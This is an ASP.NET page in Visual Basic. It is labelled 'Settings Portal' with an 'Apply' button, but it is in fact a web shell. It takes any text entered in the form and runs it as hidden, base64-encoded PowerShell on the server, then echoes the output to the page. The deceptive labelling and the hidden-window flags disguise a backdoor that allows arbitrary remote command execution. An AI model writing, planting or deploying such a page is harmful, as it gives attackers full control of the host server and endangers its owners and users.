<%@ Page Language="VB" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>

<script runat="server">
Sub Page_Load(Sender As Object, E As EventArgs)
    If IsPostBack Then
        Dim z As String = txt.Text
        If Not String.IsNullOrEmpty(z) Then
            Try
                Dim p As New ProcessStartInfo()
                p.FileName = "powershell.exe"
                p.Arguments = "-nop -w hidden -noni -enc " & Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes(z))
                p.UseShellExecute = False
                p.RedirectStandardOutput = True
                p.RedirectStandardError = True
                p.CreateNoWindow = True
                Dim proc As Process = Process.Start(p)
                Dim o As String = proc.StandardOutput.ReadToEnd() & proc.StandardError.ReadToEnd()
                out.Text = "<pre>" & Server.HtmlEncode(o) & "</pre>"
            Catch ex As Exception
                out.Text = "<pre>error</pre>"
            End Try
        End If
    End If
End Sub
</script>

<html><body>
<form runat="server">
    <h3>Settings Portal</h3>
    <asp:TextBox ID="txt" runat="server" TextMode="MultiLine" Rows="5" Columns="60" />
    <br />
    <asp:Button ID="btnRun" runat="server" Text="Apply" />
    <br /><br />
    <asp:Literal ID="out" runat="server" />
</form>
</body></html>
